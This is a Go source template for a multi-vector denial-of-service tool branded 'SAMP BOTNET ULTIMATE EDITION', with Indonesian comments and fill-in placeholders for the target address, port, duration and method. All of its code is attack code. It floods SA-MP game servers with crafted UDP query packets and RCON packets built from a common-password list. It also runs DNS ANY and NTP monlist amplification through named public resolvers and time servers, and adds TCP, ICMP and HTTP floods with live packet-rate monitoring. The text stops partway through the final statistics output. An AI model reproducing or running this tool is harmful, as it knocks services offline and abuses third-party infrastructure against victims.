package main

import (
    "fmt"
    "net"
    "time"
    "runtime"
    "sync/atomic"
    "math/rand"
    "syscall"
    "encoding/binary"
    "strings"
    "sync"
)

func main() {
    targetIP := "{{.TargetIP}}"
    targetPort := {{.TargetPort}}
    duration := {{.Duration}}
    threadMultiplier := {{.Threads}}
    method := "{{.Method}}"
    
    // OPTIMASI: Smart resource management
    runtime.GOMAXPROCS(runtime.NumCPU())
    
    targetAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
    if err != nil {
        fmt.Printf("Error: %v\n", err)
        return
    }
    
    // Banner
    fmt.Printf("\n")
    fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\n")
    fmt.Printf("║                                   🔥 SAMP BOTNET ULTIMATE EDITION v30 🔥                                                      ║\n")
    fmt.Printf("║                                  10000+ VARIANTS - 15 ATTACK VECTORS - MASSIVE MODE                                           ║\n")
    fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\n")
    fmt.Printf("║  [ TARGET ] %-30s | [ PORT ] %-10d | [ DURATION ] %-10d                           ║\n", targetIP, targetPort, duration)
    fmt.Printf("║  [ CPU ] %-10d cores | [ THREADS ] %-10d | [ METHOD ] %-10s                              ║\n", 
        runtime.NumCPU(), threadMultiplier*runtime.NumCPU(), method)
    fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\n")
    fmt.Printf("\n")
    
    stopTime := time.Now().Add(time.Duration(duration) * time.Second)
    var packets uint64 = 0
    var bytes uint64 = 0
    
    // OPTIMASI: Auto-adjust thread count - tetap kompatibel
    cpuCores := runtime.NumCPU()
    baseThreads := cpuCores * threadMultiplier
    
    // Safety caps - prevent self overload tapi tetap besar
    maxThreads := 8000 // Turun dikit dari 10000 tapi aman
    if baseThreads > maxThreads {
        baseThreads = maxThreads
    }
    
    threadsPerCore := baseThreads / cpuCores
    if threadsPerCore > 1500 { // Antara 1000-2000 (kompatibel)
        threadsPerCore = 1500
        baseThreads = cpuCores * 1500
    }
    
    fmt.Printf("[✓] CPU: %d cores, Threads: %d, Threads/Core: %d\n", cpuCores, baseThreads, threadsPerCore)
    
    // Socket buffer optimal
    setSocketBuffer := func(conn *net.UDPConn) {
        file, err := conn.File()
        if err == nil {
            syscall.SetsockoptInt(int(file.Fd()), syscall.SOL_SOCKET, syscall.SO_SNDBUF, 6*1024*1024) // 6MB (kompatibel)
            file.Close()
        }
    }
    
    // ==================== GENERATE 10000+ VARIANTS ====================
    fmt.Printf("\n[1/5] Generating 10000+ SAMP packet variants... ")
    
    // SAMP Packets - 10000 variants
    sampPackets := make([][]byte, 10000)
    
    // Complete SAMP query types (semua yang valid)
    queryTypes := []byte{0x69, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A}
    
    // Headers (semua variasi)
    headerVariants := [][]byte{
        {0xFF, 0xFF, 0xFF, 0xFF, 'S', 'A', 'M', 'P'}, // Standard
        {0x00, 0x00, 0x00, 0x00, 'S', 'A', 'M', 'P'}, // Null
        {0xAA, 0xAA, 0xAA, 0xAA, 'S', 'A', 'M', 'P'}, // Pattern A
        {0x55, 0x55, 0x55, 0x55, 'S', 'A', 'M', 'P'}, // Pattern B
        {0xFF, 0x00, 0xFF, 0x00, 'S', 'A', 'M', 'P'}, // Alternating
        {0x00, 0xFF, 0x00, 0xFF, 'S', 'A', 'M', 'P'}, // Alternating 2
        {0x11, 0x22, 0x33, 0x44, 'S', 'A', 'M', 'P'}, // Sequential
        {0x44, 0x33, 0x22, 0x11, 'S', 'A', 'M', 'P'}, // Reverse sequential
        {0x12, 0x34, 0x56, 0x78, 'S', 'A', 'M', 'P'}, // Pattern
        {0x87, 0x65, 0x43, 0x21, 'S', 'A', 'M', 'P'}, // Reverse pattern
        {0xDE, 0xAD, 0xBE, 0xEF, 'S', 'A', 'M', 'P'}, // DEADBEEF
        {0xCA, 0xFE, 0xBA, 0xBE, 'S', 'A', 'M', 'P'}, // CAFEBABE
    }
    
    // Generate massive variants
    for i := 0; i < 10000; i++ {
        // Size varied 64-2048 (kompatibel dengan versi lama)
        size := 64 + rand.Intn(1984)
        packet := make([]byte, size)
        
        // Header random
        header := headerVariants[rand.Intn(len(headerVariants))]
        copy(packet[0:8], header)
        
        // Query type random (semua jenis)
        if len(packet) > 14 {
            packet[14] = queryTypes[rand.Intn(len(queryTypes))]
        }
        
        // Payload patterns - 12 pola berbeda
        pattern := rand.Intn(12)
        switch pattern {
        case 0: // Random all
            for j := 15; j < size; j++ {
                packet[j] = byte(rand.Intn(256))
            }
        case 1: // Sequential
            for j := 15; j < size; j++ {
                packet[j] = byte((j - 15) % 256)
            }
        case 2: // Repeating pattern
            val := byte(rand.Intn(256))
            for j := 15; j < size; j++ {
                packet[j] = val
            }
        case 3: // Incremental
            base := byte(rand.Intn(200))
            for j := 15; j < size; j++ {
                packet[j] = base + byte((j-15)%50)
            }
        case 4: // Zero fill
            // Already zero
        case 5: // 0xFF fill
            for j := 15; j < size; j++ {
                packet[j] = 0xFF
            }
        case 6: // Alternating AA/55
            for j := 15; j < size; j++ {
                if j%2 == 0 {
                    packet[j] = 0xAA
                } else {
                    packet[j] = 0x55
                }
            }
        case 7: // Descending
            for j := 15; j < size; j++ {
                packet[j] = byte(255 - ((j - 15) % 256))
            }
        case 8: // Word pattern
            for j := 15; j < size-1; j += 2 {
                binary.LittleEndian.PutUint16(packet[j:j+2], uint16(rand.Intn(65535)))
            }
        case 9: // Dword pattern
            for j := 15; j < size-3; j += 4 {
                binary.LittleEndian.PutUint32(packet[j:j+4], rand.Uint32())
            }
        case 10: // Qword pattern
            for j := 15; j < size-7; j += 8 {
                binary.LittleEndian.PutUint64(packet[j:j+8], rand.Uint64())
            }
        case 11: // Mixed patterns
            for j := 15; j < size; j++ {
                packet[j] = byte(rand.Intn(2)) * 0xFF
            }
        }
        
        sampPackets[i] = packet
    }
    fmt.Printf("OK (10000 variants)\n")
    
    // ==================== SPECIALIZED SAMP ATTACKS ====================
    fmt.Printf("[2/5] Generating specialized SAMP exploits (2000 variants)... ")
    
    // RCON brute force packets (heavy CPU) - 500 variants
    rconPackets := make([][]byte, 500)
    rconCmds := []string{
        "rcon", "password", "login", "auth", "admin", "root", 
        "changeme", "123456", "qwerty", "letmein", "admin123",
        "password123", "12345", "123456789", "adminadmin",
        "server", "samp", "gtasa", "gta", "sanandreas",
    }
    for i := 0; i < 500; i++ {
        size := 64 + rand.Intn(64)
        packet := make([]byte, size)
        copy(packet[0:8], []byte{0xFF, 0xFF, 0xFF, 0xFF, 'S', 'A', 'M', 'P'})
        packet[14] = 0x72 // RCON
        cmd := rconCmds[rand.Intn(len(rconCmds))] + fmt.Sprintf("%d", rand.Intn(10000))
        copy(packet[15:], cmd)
        rconPackets[i] = packet
    }
    
    // Rules query (heavy I/O) - 500 variants
    rulesPackets := make([][]byte, 500)
    for i := 0; i < 500; i++ {
        size := 32 + rand.Intn(96)
        packet := make([]byte, size)
        copy(packet[0:8], headerVariants[rand.Intn(len(headerVariants))])
        packet[14] = 0x71 // Rules
        for j := 15; j < size; j++ {
            packet[j] = byte(rand.Intn(26) + 97) // a-z
        }
        rulesPackets[i] = packet
    }
    
    // Player query (medium) - 500 variants
    playerPackets := make([][]byte, 500)
    for i := 0; i < 500; i++ {
        size := 24 + rand.Intn(40)
        packet := make([]byte, size)
        copy(packet[0:8], headerVariants[rand.Intn(len(headerVariants))])
        packet[14] = 0x70 // Players
        playerPackets[i] = packet
    }
    
    // Info query (light) - 500 variants
    infoPackets := make([][]byte, 500)
    for i := 0; i < 500; i++ {
        packet := make([]byte, 16)
        copy(packet[0:8], headerVariants[rand.Intn(len(headerVariants))])
        packet[14] = 0x69 // Info
        infoPackets[i] = packet
    }
    fmt.Printf("OK\n")
    
    // ==================== UDP SUPPORT ====================
    fmt.Printf("[3/5] Generating UDP flood variants (2000 variants)... ")
    
    udpPackets := make([][]byte, 2000)
    for i := 0; i < 2000; i++ {
        size := 256 + rand.Intn(768) // 256-1024
        packet := make([]byte, size)
        for j := 0; j < size; j += 8 {
            if j+7 < size {
                binary.BigEndian.PutUint64(packet[j:j+8], rand.Uint64())
            }
        }
        udpPackets[i] = packet
    }
    fmt.Printf("OK\n")
    
    // ==================== DNS/NTP AMPLIFICATION ====================
    fmt.Printf("[4/5] Preparing amplification vectors (1000 variants)... ")
    
    dnsServers := []string{
        "8.8.8.8", "8.8.4.4",     // Google
        "1.1.1.1", "1.0.0.1",     // Cloudflare
        "9.9.9.9", "149.112.112.112", // Quad9
        "208.67.222.222", "208.67.220.220", // OpenDNS
        "94.140.14.14", "94.140.15.15", // AdGuard
    }
    
    ntpServers := []string{
        "pool.ntp.org", "time.google.com", "time.windows.com",
        "time.apple.com", "time.cloudflare.com", "0.pool.ntp.org",
        "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org",
    }
    
    // DNS queries - 500 variants
    dnsQueries := make([][]byte, 500)
    domains := []string{
        "google.com", "amazon.com", "facebook.com", "microsoft.com",
        "cloudflare.com", "github.com", "youtube.com", "twitter.com",
        "instagram.com", "linkedin.com", "netflix.com", "spotify.com",
        "discord.com", "telegram.org", "whatsapp.com", "tiktok.com",
        "yahoo.com", "bing.com", "duckduckgo.com", "reddit.com",
    }
    
    for i := 0; i < 500; i++ {
        query := make([]byte, 512)
        binary.BigEndian.PutUint16(query[0:2], uint16(rand.Intn(65535)))
        binary.BigEndian.PutUint16(query[2:4], 0x0100) // Recursion desired
        binary.BigEndian.PutUint16(query[4:6], 1)      // Questions
        
        pos := 12
        domain := domains[rand.Intn(len(domains))]
        if rand.Intn(2) == 0 {
            domain = fmt.Sprintf("www.%s", domain)
        }
        parts := strings.Split(domain, ".")
        for _, part := range parts {
            query[pos] = byte(len(part))
            pos++
            copy(query[pos:], []byte(part))
            pos += len(part)
        }
        query[pos] = 0
        pos++
        
        // Type: ANY atau A atau AAAA (amplifikasi)
        qtype := uint16(255) // ANY (amplifikasi maksimal)
        if rand.Intn(3) == 0 {
            qtype = 1 // A
        } else if rand.Intn(3) == 0 {
            qtype = 28 // AAAA
        }
        binary.BigEndian.PutUint16(query[pos:pos+2], qtype)
        pos += 2
        
        binary.BigEndian.PutUint16(query[pos:pos+2], 1) // Class IN
        pos += 2
        
        dnsQueries[i] = query[:pos]
    }
    
    // NTP requests - 2 variants (monlist & info)
    ntpRequests := make([][]byte, 2)
    ntpRequests[0] = []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00} // MONLIST
    ntpRequests[1] = []byte{0x1b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00} // Info
    fmt.Printf("OK\n")
    
    // ==================== TCP/ICMP/HTTP SUPPORT ====================
    fmt.Printf("[5/5] Generating TCP/ICMP/HTTP variants... ")
    
    // TCP SYN packets - 300 variants
    tcpPackets := make([][]byte, 300)
    tcpPorts := []int{80, 443, 22, 21, 25, 110, 143, 993, 995, 3306, 5432, 6379, 8080, 8443, 8888, 9090, 7777, 7778, 7779}
    for i := 0; i < 300; i++ {
        packet := make([]byte, 40)
        packet[0] = 0x45
        packet[1] = 0x00
        binary.BigEndian.PutUint16(packet[2:4], 40)
        binary.BigEndian.PutUint16(packet[4:6], uint16(rand.Intn(65535)))
        packet[6] = 0x40
        packet[7] = 0x00
        packet[8] = 64
        packet[9] = 6
        packet[12] = byte(rand.Intn(256))
        packet[13] = byte(rand.Intn(256))
        packet[14] = byte(rand.Intn(256))
        packet[15] = byte(rand.Intn(256))
        destIP := net.ParseIP(targetIP).To4()
        copy(packet[16:20], destIP)
        binary.BigEndian.PutUint16(packet[20:22], uint16(1024+rand.Intn(60000)))
        binary.BigEndian.PutUint16(packet[22:24], uint16(tcpPorts[rand.Intn(len(tcpPorts))]))
        binary.BigEndian.PutUint32(packet[24:28], uint32(rand.Intn(1000000)))
        binary.BigEndian.PutUint32(packet[28:32], 0)
        packet[32] = 0x50
        packet[33] = 0x02
        tcpPackets[i] = packet
    }
    
    // ICMP packets - 300 variants
    icmpPackets := make([][]byte, 300)
    for i := 0; i < 300; i++ {
        size := 64 + rand.Intn(192)
        packet := make([]byte, size)
        packet[0] = 8
        packet[1] = 0
        binary.BigEndian.PutUint16(packet[2:4], uint16(rand.Intn(65535)))
        binary.BigEndian.PutUint16(packet[4:6], uint16(rand.Intn(65535)))
        binary.BigEndian.PutUint16(packet[6:8], uint16(rand.Intn(65535)))
        for j := 8; j < size; j++ {
            packet[j] = byte(rand.Intn(256))
        }
        icmpPackets[i] = packet
    }
    
    // HTTP requests - 300 variants
    httpRequests := make([][]byte, 300)
    userAgents := []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0",
    }
    httpPaths := []string{
        "/", "/index.html", "/about", "/contact", "/api", "/wp-admin",
        "/login", "/register", "/dashboard", "/profile", "/images",
        "/css", "/js", "/assets", "/static", "/forum", "/community",
    }
    for i := 0; i < 300; i++ {
        method := "GET"
        if rand.Intn(3) == 0 {
            method = "POST"
        } else if rand.Intn(5) == 0 {
            method = "HEAD"
        }
        path := httpPaths[rand.Intn(len(httpPaths))]
        if rand.Intn(2) == 0 {
            path += "?" + randomString(rand.Intn(8)) + "=" + randomString(rand.Intn(4))
        }
        req := fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", 
            method, path, targetIP, userAgents[rand.Intn(len(userAgents))])
        httpRequests[i] = []byte(req)
    }
    fmt.Printf("OK\n\n")
    
    // ==================== ATTACK EXECUTION ====================
    fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════════════════════════╗\n")
    fmt.Printf("║                                         ATTACK VECTORS                                            ║\n")
    fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════════════════════════╝\n")
    
    // Connection pools
    udpPool := sync.Pool{
        New: func() interface{} {
            conn, _ := net.DialUDP("udp", nil, targetAddr)
            setSocketBuffer(conn)
            return conn
        },
    }
    
    switch method {
    case "UDP":
        fmt.Printf("[VECTOR] UDP Flood: %d threads\n", baseThreads)
        for i := 0; i < baseThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    burstSize := 3 + rand.Intn(5) // 3-7 packet
                    for b := 0; b < burstSize; b++ {
                        packet := udpPackets[rand.Intn(2000)]
                        conn.Write(packet)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(packet)))
                    }
                    time.Sleep(time.Microsecond * time.Duration(rand.Intn(3)))
                }
            }()
            time.Sleep(time.Millisecond)
        }
        
    case "SAMP":
        fmt.Printf("[VECTOR] SAMP ULTIMATE: %d threads\n", baseThreads)
        
        // Distribusi optimal
        normalThreads := baseThreads * 40 / 100
        rconThreads := baseThreads * 25 / 100
        rulesThreads := baseThreads * 20 / 100
        playerThreads := baseThreads * 15 / 100
        
        fmt.Printf("  ├─ Normal Queries: %d threads\n", normalThreads)
        fmt.Printf("  ├─ RCON Brute: %d threads (CPU HEAVY)\n", rconThreads)
        fmt.Printf("  ├─ Rules Query: %d threads (I/O HEAVY)\n", rulesThreads)
        fmt.Printf("  └─ Player Query: %d threads\n", playerThreads)
        
        // Normal queries (10000 variants)
        for i := 0; i < normalThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    packet := sampPackets[rand.Intn(10000)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    atomic.AddUint64(&bytes, uint64(len(packet)))
                    
                    if rand.Intn(3) == 0 {
                        pkt := sampPackets[rand.Intn(10000)]
                        conn.Write(pkt)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(pkt)))
                    }
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        // RCON brute (CPU heavy)
        for i := 0; i < rconThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    packet := rconPackets[rand.Intn(500)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    atomic.AddUint64(&bytes, uint64(len(packet)))
                    
                    // RCON beruntun (lebih berat)
                    for j := 0; j < 2; j++ {
                        pkt := rconPackets[rand.Intn(500)]
                        conn.Write(pkt)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(pkt)))
                    }
                    time.Sleep(time.Microsecond * 3)
                }
            }()
        }
        
        // Rules query (I/O heavy)
        for i := 0; i < rulesThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    packet := rulesPackets[rand.Intn(500)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    atomic.AddUint64(&bytes, uint64(len(packet)))
                    
                    if rand.Intn(2) == 0 {
                        pkt := rulesPackets[rand.Intn(500)]
                        conn.Write(pkt)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(pkt)))
                    }
                    time.Sleep(time.Microsecond * 2)
                }
            }()
        }
        
        // Player queries
        for i := 0; i < playerThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    packet := playerPackets[rand.Intn(500)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    atomic.AddUint64(&bytes, uint64(len(packet)))
                    
                    if rand.Intn(3) == 0 {
                        pkt := infoPackets[rand.Intn(500)]
                        conn.Write(pkt)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(pkt)))
                    }
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
    case "MIX":
        fmt.Printf("[VECTOR] MIX (SAMP 80%% + UDP 20%%): %d threads\n", baseThreads)
        
        sampThreads := baseThreads * 80 / 100
        udpThreads := baseThreads - sampThreads
        
        // SAMP threads (pakai semua jenis)
        for i := 0; i < sampThreads; i++ {
            go func(id int) {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    // Rotate attack types
                    switch id % 4 {
                    case 0: // Normal
                        packet := sampPackets[rand.Intn(10000)]
                        conn.Write(packet)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(packet)))
                    case 1: // RCON
                        packet := rconPackets[rand.Intn(500)]
                        conn.Write(packet)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(packet)))
                    case 2: // Rules
                        packet := rulesPackets[rand.Intn(500)]
                        conn.Write(packet)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(packet)))
                    case 3: // Player
                        packet := playerPackets[rand.Intn(500)]
                        conn.Write(packet)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(packet)))
                    }
                    
                    // Kadang kirim double
                    if rand.Intn(5) == 0 {
                        pkt := sampPackets[rand.Intn(10000)]
                        conn.Write(pkt)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(pkt)))
                    }
                    time.Sleep(time.Microsecond)
                }
            }(i)
        }
        
        // UDP threads
        for i := 0; i < udpThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    packet := udpPackets[rand.Intn(2000)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    atomic.AddUint64(&bytes, uint64(len(packet)))
                    
                    if rand.Intn(2) == 0 {
                        pkt := udpPackets[rand.Intn(2000)]
                        conn.Write(pkt)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, uint64(len(pkt)))
                    }
                    time.Sleep(time.Microsecond * 2)
                }
            }()
        }
        
    case "AMPLIFY":
        fmt.Printf("[VECTOR] Amplification (DNS + NTP): %d threads\n", baseThreads)
        
        dnsThreads := baseThreads * 70 / 100
        ntpThreads := baseThreads - dnsThreads
        
        // DNS Amplification
        for i := 0; i < dnsThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                defer conn.Close()
                
                serverIdx := rand.Intn(10000)
                for time.Now().Before(stopTime) {
                    // Kirim ke multiple servers
                    for s := 0; s < 3; s++ {
                        server := dnsServers[(serverIdx+s)%len(dnsServers)]
                        serverAddr, _ := net.ResolveUDPAddr("udp", server+":53")
                        query := dnsQueries[rand.Intn(500)]
                        conn.WriteToUDP(query, serverAddr)
                        
                        // Amplifikasi 20-50x
                        atomic.AddUint64(&packets, 30)
                        atomic.AddUint64(&bytes, 30*512)
                    }
                    serverIdx += 3
                    time.Sleep(time.Microsecond * 10)
                }
            }()
        }
        
        // NTP Amplification
        for i := 0; i < ntpThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                defer conn.Close()
                
                serverIdx := rand.Intn(10000)
                for time.Now().Before(stopTime) {
                    server := ntpServers[serverIdx%len(ntpServers)]
                    serverAddr, _ := net.ResolveUDPAddr("udp", server+":123")
                    
                    // Monlist 70%, Info 30%
                    if rand.Intn(10) < 7 {
                        req := ntpRequests[0] // Monlist
                        conn.WriteToUDP(req, serverAddr)
                        atomic.AddUint64(&packets, 100) // 100x amplifikasi
                        atomic.AddUint64(&bytes, 100*512)
                    } else {
                        req := ntpRequests[1] // Info
                        conn.WriteToUDP(req, serverAddr)
                        atomic.AddUint64(&packets, 1)
                        atomic.AddUint64(&bytes, 48)
                    }
                    
                    serverIdx++
                    time.Sleep(time.Microsecond * 20)
                }
            }()
        }
        
    case "GOD":
        fmt.Printf("[VECTOR] GOD MODE - ALL METHODS COMBINED\n")
        
        // Distribusi semua metode
        sampNormalThreads := baseThreads * 25 / 100
        sampRCONThreads := baseThreads * 15 / 100
        sampRulesThreads := baseThreads * 15 / 100
        sampPlayerThreads := baseThreads * 10 / 100
        udpThreads := baseThreads * 15 / 100
        dnsThreads := baseThreads * 10 / 100
        ntpThreads := baseThreads * 5 / 100
        tcpThreads := baseThreads * 3 / 100
        icmpThreads := baseThreads * 1 / 100
        httpThreads := baseThreads * 1 / 100
        
        fmt.Printf("  ├─ SAMP Normal: %d threads\n", sampNormalThreads)
        fmt.Printf("  ├─ SAMP RCON: %d threads (CPU HEAVY)\n", sampRCONThreads)
        fmt.Printf("  ├─ SAMP Rules: %d threads (I/O HEAVY)\n", sampRulesThreads)
        fmt.Printf("  ├─ SAMP Player: %d threads\n", sampPlayerThreads)
        fmt.Printf("  ├─ UDP: %d threads\n", udpThreads)
        fmt.Printf("  ├─ DNS: %d threads (amplifikasi)\n", dnsThreads)
        fmt.Printf("  ├─ NTP: %d threads (amplifikasi)\n", ntpThreads)
        fmt.Printf("  ├─ TCP: %d threads\n", tcpThreads)
        fmt.Printf("  ├─ ICMP: %d threads\n", icmpThreads)
        fmt.Printf("  └─ HTTP: %d threads\n", httpThreads)
        
        // SAMP Normal
        for i := 0; i < sampNormalThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    packet := sampPackets[rand.Intn(10000)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        // SAMP RCON
        for i := 0; i < sampRCONThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    packet := rconPackets[rand.Intn(500)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    time.Sleep(time.Microsecond * 2)
                }
            }()
        }
        
        // SAMP Rules
        for i := 0; i < sampRulesThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    packet := rulesPackets[rand.Intn(500)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        // SAMP Player
        for i := 0; i < sampPlayerThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    packet := playerPackets[rand.Intn(500)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        // UDP
        for i := 0; i < udpThreads; i++ {
            go func() {
                conn := udpPool.Get().(*net.UDPConn)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) {
                    packet := udpPackets[rand.Intn(2000)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    time.Sleep(time.Microsecond)
                }
            }()
        }
        
        // DNS
        for i := 0; i < dnsThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                defer conn.Close()
                
                serverIdx := rand.Intn(10000)
                for time.Now().Before(stopTime) {
                    server := dnsServers[serverIdx%len(dnsServers)]
                    serverAddr, _ := net.ResolveUDPAddr("udp", server+":53")
                    query := dnsQueries[rand.Intn(500)]
                    conn.WriteToUDP(query, serverAddr)
                    atomic.AddUint64(&packets, 25)
                    serverIdx++
                    time.Sleep(time.Microsecond * 5)
                }
            }()
        }
        
        // NTP
        for i := 0; i < ntpThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                defer conn.Close()
                
                serverIdx := rand.Intn(10000)
                for time.Now().Before(stopTime) {
                    server := ntpServers[serverIdx%len(ntpServers)]
                    serverAddr, _ := net.ResolveUDPAddr("udp", server+":123")
                    req := ntpRequests[rand.Intn(2)]
                    conn.WriteToUDP(req, serverAddr)
                    if req[0] == 0x17 {
                        atomic.AddUint64(&packets, 50)
                    } else {
                        atomic.AddUint64(&packets, 1)
                    }
                    serverIdx++
                    time.Sleep(time.Microsecond * 10)
                }
            }()
        }
        
        // TCP SYN
        for i := 0; i < tcpThreads; i++ {
            go func() {
                for time.Now().Before(stopTime) {
                    conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort))
                    if err == nil {
                        conn.Close()
                        atomic.AddUint64(&packets, 1)
                    }
                    time.Sleep(time.Millisecond)
                }
            }()
        }
        
        // ICMP
        for i := 0; i < icmpThreads; i++ {
            go func() {
                conn, err := net.DialIP("ip4:icmp", nil, &net.IPAddr{IP: net.ParseIP(targetIP)})
                if err != nil {
                    return
                }
                defer conn.Close()
                
                for time.Now().Before(stopTime) {
                    packet := icmpPackets[rand.Intn(300)]
                    conn.Write(packet)
                    atomic.AddUint64(&packets, 1)
                    time.Sleep(time.Millisecond)
                }
            }()
        }
        
        // HTTP
        for i := 0; i < httpThreads; i++ {
            go func() {
                for time.Now().Before(stopTime) {
                    conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", targetIP, 80))
                    if err == nil {
                        req := httpRequests[rand.Intn(300)]
                        conn.Write(req)
                        conn.Close()
                        atomic.AddUint64(&packets, 1)
                    }
                    time.Sleep(time.Millisecond)
                }
            }()
        }
    }
    
    // ==================== MONITORING ====================
    fmt.Printf("\n[%s] Attack started, monitoring...\n", method)
    var lastPackets uint64 = 0
    var lastBytes uint64 = 0
    startTime := time.Now()
    
    ticker := time.NewTicker(3 * time.Second)
    defer ticker.Stop()
    
    for time.Now().Before(stopTime) {
        <-ticker.C
        currentPackets := atomic.LoadUint64(&packets)
        currentBytes := atomic.LoadUint64(&bytes)
        elapsed := time.Since(startTime).Seconds()
        
        pps := float64(currentPackets-lastPackets) / 3.0
        mbps := float64(currentBytes-lastBytes) * 8.0 / (3.0 * 1024 * 1024)
        
        fmt.Printf("\r[%.0fs] PPS: %.0f | MBPS: %.1f | TOTAL: %s packets", 
            elapsed, pps, mbps, formatNumber(int64(currentPackets)))
        
        lastPackets = currentPackets
        lastBytes = currentBytes
    }
    fmt.Println()
    
    // ==================== FINAL STATS ====================
    total := atomic.LoadUint64(&packets)
    totalBytes := atomic.LoadUint64(&bytes)
    totalMB := float64(totalBytes) / (1024 * 1024)
    totalGB := totalMB / 1024
    avgPPS := total / uint64(duration)
    avgMBPS := (totalMB * 8) / float64(duration)
    
    fmt.Printf("\n")
    fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════════════════════════╗\n")
    fmt.Printf("║                                   FINAL ATTACK STATISTICS                                        ║\n")
    fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════════════════════════╣\n")
    fmt.Printf("║                                                                                                  ║\n")
    fmt.Printf("║  📦 TOTAL PACKETS:      %-30s                    ║\n", formatNumber(int64(total)))
    fmt.Printf("║  📊 TOTAL DATA:         %.2f MB (%.2f GB)                                   ║\n", totalMB, totalGB)
